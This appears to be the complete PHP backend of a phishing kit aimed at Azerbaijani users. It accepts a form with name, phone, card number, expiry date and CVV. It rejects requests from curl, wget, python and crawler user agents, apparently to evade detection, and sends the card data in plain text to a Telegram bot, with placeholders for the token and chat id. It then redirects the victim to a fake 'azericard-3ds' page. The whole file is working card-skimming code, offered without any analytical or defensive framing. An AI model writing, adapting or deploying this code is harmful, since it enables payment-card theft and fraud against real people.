<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit('Method Not Allowed'); }
if (!isset($_SERVER['HTTP_ORIGIN']) || $_SERVER['HTTP_ORIGIN'] !== 'https://kontaktshome.com') { http_response_code(403); exit('Forbidden'); }
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (empty($userAgent) || preg_match('/curl|wget|python|bot|spider/i', $userAgent)) { http_response_code(403); exit('Bot detected'); }
$amount = $_POST['amount'] ?? null; $name = $_POST['name'] ?? null; $phone = $_POST['phone'] ?? null; $card = $_POST['card'] ?? null; $expdate = $_POST['expdate'] ?? null; $cvv = $_POST['cvv'] ?? null;
if (empty($amount) || empty($name) || empty($phone) || empty($card) || empty($expdate) || empty($cvv)) { http_response_code(400); exit('Bütün xanalar doldurulmalıdır.'); }
if (!preg_match('/^[0-9]{16}$/', str_replace(' ', '', $card)) || !preg_match('/^[0-9]{3}$/', $cvv)) { http_response_code(400); exit('Yanlış kart məlumatı formatı.'); }
$botToken = 'SIZIN_BOT_TOKEN'; $chatId = 'SIZIN_CHAT_ID'; $message = "Yeni Sifariş:\nAd: $name\nNömrə: $phone\nMəbləğ: $amount\nKart: $card\nTarix: $expdate\nCVV: $cvv";
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message); @file_get_contents($url);
header("Location: azericard-3ds.html?amount=" . urlencode($amount) . "&card=" . urlencode($card)); exit();
?>
